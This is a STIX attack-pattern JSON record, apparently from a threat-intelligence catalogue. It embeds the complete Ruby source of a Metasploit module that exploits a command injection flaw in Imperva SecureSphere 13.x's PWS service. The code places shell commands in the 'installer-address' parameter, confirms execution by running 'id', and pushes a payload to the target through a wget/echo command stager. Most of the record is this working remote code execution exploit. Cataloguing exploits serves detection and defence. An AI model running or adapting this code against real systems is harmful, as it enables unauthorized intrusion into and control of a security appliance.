{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0d4adefe-4580-43d7-9002-efacc957728d",
    "created": "2024-08-14T17:01:38.267892Z",
    "modified": "2024-08-14T17:01:38.267896Z",
    "name": "Imperva SecureSphere PWS Command Injection",
    "description": "( This module exploits a command injection vulnerability in Imperva SecureSphere 13.x. The vulnerability exists in the PWS service where Python CGIs didn't properly sanitize user supplied command parameters and directly passes them to corresponding CLI utility leading to command injection. Agent registration credential is required to exploit SecureSphere in gateway mode.  This module was successfully tested on Imperva SecureSphere 13.0/13.1/ 13.2 in pre-ftl mode and unsealed gateway mode. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/imperva_securesphere_exec.rb",
            "external_id": "imperva_securesphere_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'           => 'Imperva SecureSphere PWS Command Injection',\n        'Description'    => %q(\n          This module exploits a command injection vulnerability in Imperva\n          SecureSphere 13.x. The vulnerability exists in the PWS service,\n          where Python CGIs didn't properly sanitize user supplied command\n          parameters and directly passes them to corresponding CLI utility,\n          leading to command injection. Agent registration credential is\n          required to exploit SecureSphere in gateway mode.\n\n          This module was successfully tested on Imperva SecureSphere 13.0/13.1/\n          13.2 in pre-ftl mode and unsealed gateway mode.\n        ),\n        'License'        => MSF_LICENSE,\n        'Author'         =>\n          [\n            'rsp3ar <lukunming<at>gmail.com>' # Discovery/Metasploit Module\n          ],\n        'References'     =>\n          [\n            [ 'EDB', '45542' ]\n          ],\n        'DisclosureDate'  => '2018-10-08',\n        'DefaultOptions' => {\n          'SSL' => true,\n          'PrependFork' => true,\n        },\n        'Platform'        => 'linux',\n        'Arch'            => [ARCH_X86, ARCH_X64],\n        'CmdStagerFlavor' => %w{ echo printf wget },\n        'Targets'         =>\n          [\n            ['Imperva SecureSphere 13.0/13.1/13.2', {}]\n          ],\n        'DefaultTarget'   => 0))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('USERNAME', [false, 'Agent registration username', 'imperva']),\n        OptString.new('PASSWORD', [false, 'Agent registration password', '']),\n        OptString.new('TARGETURI', [false, 'The URI path to impcli', '/pws/impcli']),\n        OptInt.new('TIMEOUT', [false, 'HTTP connection timeout', 15])\n      ])\n  end\n\n  def check\n    begin\n      res = execute_command('id')\n    rescue => e\n      vprint_error(\"#{e}\")\n      return CheckCode::Unknown\n    end\n\n    if res.body =~ /uid=\\d+/\n      return CheckCode::Vulnerable\n    end\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"Sending payload #{datastore['PAYLOAD']}\")\n    execute_cmdstager\n  end\n\n  def execute_command(cmd, opts = {})\n    data = {\n      'command'     => 'impctl server status',\n      'parameters'  => {\n        'broadcast'         => true,\n        'installer-address' => \"127.0.0.1 $(#{cmd})\"\n      }\n    }\n\n    res = send_request data\n\n    return unless res\n\n    if res.code == 401\n      fail_with(Failure::NoAccess, 'Authorization Failure, valid agent registration credential is required')\n    end\n\n    unless res.code == 406 && res.body.include?(\"impctl\")\n      fail_with(Failure::Unknown, 'Server did not respond in an expected way')\n    end\n\n    res\n  end\n\n  def send_request(data)\n    req_params = {\n      'method'      => 'POST',\n      'uri'         => normalize_uri(target_uri.path),\n      'data'        => data.to_json\n    }\n\n    if !datastore['USERNAME'].blank? && !datastore['PASSWORD'].blank?\n      unless @cookie\n        res = send_request_cgi({\n          'method'      => 'GET',\n          'uri'         => normalize_uri('/')\n        })\n        unless res\n          fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n        end\n\n        @cookie = res.get_cookies\n      end\n\n      req_params['cookie'] = @cookie\n      req_params['headers'] = {\n        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])\n      }\n    end\n\n    send_request_cgi(req_params, datastore['TIMEOUT'])\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-10-08",
    "x_mitre_platforms": [
        "linux'"
    ]
}